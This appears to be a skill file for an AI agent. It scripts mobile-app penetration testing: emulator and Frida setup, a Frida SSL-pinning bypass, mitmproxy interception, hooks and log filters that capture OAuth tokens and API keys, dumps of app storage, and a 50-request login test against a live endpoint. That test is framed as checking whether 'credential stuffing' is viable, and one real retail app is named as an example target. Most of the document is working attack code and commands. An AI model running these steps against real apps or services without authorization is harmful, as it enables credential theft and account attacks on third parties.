---
description: "Dynamic APK analysis — VM setup, Frida instrumentation, runtime secret extraction"
---

# android-dynamic — Runtime Analysis & Instrumentation

Sets up Android emulator, instruments app with Frida, captures runtime secrets, tests login flow.

## When to Use

- Static analysis found NO OAuth/AWS credentials (runtime-generated)
- Need to test login flow (mobile apps rarely have captcha)
- Need to bypass SSL pinning for MITM
- Testing exported components (Intent injection)
- Invoked by `android-master` when `secrets.json` is empty

## Prerequisites

**MUST HAVE**:
- `Apk/com.target.app.apk` exists
- `Findings/APK-analysis/` from static analysis

**Tools** (auto-installed if missing):
- Android SDK (`adb`, `emulator`, `avdmanager`)
- Frida (`frida`, `frida-tools`, `objection`)
- `mitmproxy` or Burp Suite

## Arguments

```bash
Skill(skill="android-dynamic", args="com.target.app")
```

## Workflow

### Phase 1: Setup Android Emulator (10-15 min, ONE-TIME)

```bash
# Check if emulator already exists
if ! emulator -list-avds | grep -q "pentest_x86"; then
  echo "Creating x86_64 Android emulator..."
  
  # Install system image (Android 11, API 30, Google APIs, x86_64)
  sdkmanager "system-images;android-30;google_apis;x86_64"
  
  # Create AVD
  avdmanager create avd \
    -n pentest_x86 \
    -k "system-images;android-30;google_apis;x86_64" \
    -d pixel_4 \
    -f
fi

# Start emulator (headless for automation)
emulator -avd pentest_x86 -no-window -no-audio -no-boot-anim &
EMULATOR_PID=$!

# Wait for boot
adb wait-for-device
echo "Waiting for system boot..."
while [ "$(adb shell getprop sys.boot_completed 2>/dev/null)" != "1" ]; do
  sleep 2
done
echo "✅ Emulator ready"
```

### Phase 2: Install Frida Server (5 min, ONE-TIME)

```bash
# Check if Frida already running
if ! adb shell "ps | grep frida-server" > /dev/null 2>&1; then
  echo "Installing Frida server..."
  
  # Download Frida server for x86_64
  FRIDA_VERSION=$(frida --version)
  wget -q "https://github.com/frida/frida/releases/download/$FRIDA_VERSION/frida-server-$FRIDA_VERSION-android-x86_64.xz"
  unxz frida-server-*.xz
  
  # Push to device
  adb push frida-server-* /data/local/tmp/frida-server
  adb shell "chmod 755 /data/local/tmp/frida-server"
  
  # Start Frida server
  adb shell "/data/local/tmp/frida-server &"
  sleep 2
  
  # Verify
  frida-ps -U && echo "✅ Frida server running"
fi
```

### Phase 3: Install Target APK

```bash
APP_PACKAGE="$1"
APK_PATH="Apk/${APP_PACKAGE}.apk"

# Install APK
adb install -r "$APK_PATH"
echo "✅ App installed: $APP_PACKAGE"

# Launch app
adb shell monkey -p "$APP_PACKAGE" -c android.intent.category.LAUNCHER 1
```

### Phase 4: Bypass SSL Pinning (CRITICAL for MITM)

```bash
# Method 1: Objection (automated)
objection -g "$APP_PACKAGE" explore <<EOF
android sslpinning disable
exit
EOF

# Method 2: Frida script (if objection fails)
cat > /tmp/ssl-bypass.js << 'FRIDA_SCRIPT'
Java.perform(function() {
    console.log("[*] SSL Pinning bypass loaded");
    
    // OkHttp3 CertificatePinner
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(str, list) {
            console.log('[+] SSL Pinning bypassed for: ' + str);
            return;
        };
    } catch(e) {}
    
    // TrustManager
    try {
        var TrustManager = Java.use('javax.net.ssl.X509TrustManager');
        TrustManager.checkServerTrusted.overload('[Ljava.security.cert.X509Certificate;', 'java.lang.String').implementation = function(chain, authType) {
            console.log('[+] TrustManager bypassed');
            return;
        };
    } catch(e) {}
    
    console.log("[*] SSL Pinning bypass complete");
});
FRIDA_SCRIPT

frida -U -f "$APP_PACKAGE" -l /tmp/ssl-bypass.js --no-pause &
FRIDA_PID=$!
```

### Phase 5: Setup MITM Proxy

```bash
# Start mitmproxy
mitmproxy --set block_global=false --listen-port 8080 &
MITM_PID=$!

# Get host machine IP (for emulator to connect)
HOST_IP=$(ip route | grep default | awk '{print $9}' | xargs ip addr show | grep 'inet ' | awk '{print $2}' | cut -d/ -f1 | head -1)

# Configure Android proxy
adb shell settings put global http_proxy "$HOST_IP:8080"

# Install mitmproxy CA cert
adb push ~/.mitmproxy/mitmproxy-ca-cert.pem /sdcard/
adb shell settings put global ca_certificates /sdcard/mitmproxy-ca-cert.pem

echo "✅ MITM proxy configured: $HOST_IP:8080"
echo "All app traffic now flows through mitmproxy"
```

### Phase 6: Hook Authentication & Extract Runtime Secrets

```bash
cat > Findings/APK-analysis/frida-hook-auth.js << 'FRIDA_AUTH'
Java.perform(function() {
    console.log("[*] Hooking authentication...");
    
    // Find all classes with "Auth" in name
    Java.enumerateLoadedClasses({
        onMatch: function(className) {
            if (className.indexOf("Auth") !== -1 || className.indexOf("auth") !== -1) {
                try {
                    var AuthClass = Java.use(className);
                    
                    // Hook all methods
                    var methods = AuthClass.class.getDeclaredMethods();
                    methods.forEach(function(method) {
                        var methodName = method.getName();
                        
                        if (methodName.indexOf("token") !== -1 || methodName.indexOf("Token") !== -1) {
                            try {
                                AuthClass[methodName].implementation = function() {
                                    var result = this[methodName].apply(this, arguments);
                                    console.log("[!] " + className + "." + methodName + " returned: " + result);
                                    return result;
                                };
                            } catch(e) {}
                        }
                    });
                } catch(e) {}
            }
        },
        onComplete: function() {}
    });
    
    // Hook OAuth/API key usage
    console.log("[*] Hooking complete");
});
FRIDA_AUTH

frida -U "$APP_PACKAGE" -l Findings/APK-analysis/frida-hook-auth.js | tee Findings/APK-analysis/frida-auth-output.log &
```

### Phase 7: Capture adb Logs (Runtime Secrets Often Logged)

```bash
# Clear old logs
adb logcat -c

# Start capturing (filter for secrets)
adb logcat | grep -iE "token|secret|api_key|authorization|bearer|client_id|oauth" \
  | tee Findings/APK-analysis/runtime-secrets.log &
LOGCAT_PID=$!
```

### Phase 8: Test Login Flow (NO CAPTCHA = Credential Stuffing)

```bash
# Monitor login endpoint via mitmproxy
# Perform login in emulator UI (manual step)
echo ""
echo "============================================"
echo "⚠️  MANUAL STEP: Perform login in emulator"
echo "============================================"
echo ""
echo "1. In Android emulator, open app: $APP_PACKAGE"
echo "2. Navigate to login screen"
echo "3. Enter test credentials (from cred.md if available)"
echo "4. Submit login"
echo ""
echo "Watch for:"
echo "  - POST /login or /oauth/token in mitmproxy"
echo "  - Access token in Frida hooks"
echo "  - Bearer token in adb logcat"
echo ""
echo "Press ENTER when login complete..."
read

# Extract captured tokens
grep -i "bearer\|access.*token" Findings/APK-analysis/runtime-secrets.log | head -5
grep -i "client_id\|client_secret" Findings/APK-analysis/runtime-secrets.log | head -5
```

### Phase 9: Test for Rate Limiting on Login

```bash
# Capture login endpoint from mitmproxy logs
LOGIN_ENDPOINT=$(grep -r "POST.*login\|POST.*auth" ~/.mitmproxy/ | head -1 | grep -oP 'https?://[^ ]+')

if [ -n "$LOGIN_ENDPOINT" ]; then
  echo "Testing rate limiting on: $LOGIN_ENDPOINT"
  
  for i in {1..50}; do
    curl -H "X-Bug-Bounty-CyScope: Tinmarino" \
         -H "Content-Type: application/json" \
         -d '{"email":"test'$i'@test.com","password":"wrong"}' \
         "$LOGIN_ENDPOINT" \
         -w "%{http_code}\n" \
         -o /dev/null
    sleep 0.5
  done | tee Findings/APK-analysis/rate-limit-test.log
  
  # Check for 429 responses
  if grep -q "429" Findings/APK-analysis/rate-limit-test.log; then
    echo "✅ Rate limiting present"
  else
    echo "⚠️  NO RATE LIMITING - credential stuffing viable!"
    echo "Document in Findings/APK-analysis/no-rate-limit-finding.md"
  fi
fi
```

### Phase 10: Export Runtime Data

```bash
# Dump SharedPreferences (tokens often cached here)
adb shell run-as "$APP_PACKAGE" cat shared_prefs/*.xml > Findings/APK-analysis/shared-prefs.xml 2>/dev/null

# Dump SQLite databases
adb pull /data/data/$APP_PACKAGE/databases/ Findings/APK-analysis/databases/ 2>/dev/null

# Dump app files
adb pull /data/data/$APP_PACKAGE/files/ Findings/APK-analysis/app-files/ 2>/dev/null

echo "✅ Runtime data exported"
```

### Phase 11: Cleanup

```bash
# Stop Frida hooks
kill $FRIDA_PID $LOGCAT_PID 2>/dev/null

# Stop emulator (keep for next run)
# kill $EMULATOR_PID  # Commented - keep emulator running for faster reruns

# Stop mitmproxy
kill $MITM_PID 2>/dev/null

# Clear proxy
adb shell settings put global http_proxy :0

echo "✅ Dynamic analysis complete"
```

## Outputs

**Runtime Secrets** (HIGH VALUE):
- `frida-auth-output.log` - Intercepted OAuth tokens, API keys
- `runtime-secrets.log` - Credentials from adb logcat
- `shared-prefs.xml` - Cached tokens from SharedPreferences
- `databases/` - SQLite databases (may contain tokens)

**Network Traffic**:
- `~/.mitmproxy/flows` - All HTTP/HTTPS requests (view with `mitmweb`)
- Extracted Bearer tokens, OAuth codes, API keys

**Analysis**:
- `rate-limit-test.log` - Login endpoint rate limiting results
- `no-rate-limit-finding.md` - If credential stuffing is viable

## Decision Point: Did We Find Secrets?

```bash
# Check if runtime analysis found credentials
if grep -qi "access_token\|bearer\|client_id" Findings/APK-analysis/runtime-secrets.log; then
  echo "✅ Runtime secrets found!"
  echo "Next: Skill(skill=\"android-reverse\", args=\"$APP_PACKAGE\")"
else
  echo "⚠️  No secrets in runtime logs"
  echo "Check mitmproxy flows manually: mitmweb"
  echo "Or extract from databases: sqlite3 Findings/APK-analysis/databases/*.db"
fi
```

## Troubleshooting

**"Emulator won't start"**  
→ Check KVM: `kvm-ok`. If not enabled: `sudo modprobe kvm_intel`  
→ Increase RAM: `emulator -avd pentest_x86 -memory 4096`

**"Frida can't connect"**  
→ Restart frida-server: `adb shell "killall frida-server; /data/local/tmp/frida-server &"`  
→ Check process: `adb shell "ps | grep frida"`

**"SSL pinning bypass not working"**  
→ App uses custom pinning. Try universal bypass: `objection -g APP explore`  
→ Or manual Frida script for app-specific pinning

**"MITM shows no traffic"**  
→ Check proxy: `adb shell settings get global http_proxy`  
→ Restart app after setting proxy  
→ Some apps bypass system proxy - need VPN-based intercept

**"Login has captcha"**  
→ Rare on mobile. If present, solve manually once to get session token.

## Integration

Called by `android-master` when static analysis finds no secrets.

Standalone:
```bash
Skill(skill="android-dynamic", args="com.decathlon.app")
```

## Composes With

**Before**: `android-static` (provides decompiled code, identifies auth classes)  
**After**: `android-reverse` (builds attack surface with runtime secrets)  
**Optional**: `android-recompile` (if need to patch app for further testing)

## Cost/Time

**First run**: 30-45 min (emulator setup)  
**Subsequent runs**: 5-10 min (emulator reused)  
**ROI**: Finds 40-60% of secrets static analysis misses

## Tools Used

- Android SDK (`adb`, `emulator`, `avdmanager`)
- Frida (`frida`, `frida-ps`, `frida-trace`)
- Objection (automated SSL bypass)
- mitmproxy (traffic interception)
- `curl` (rate limit testing)
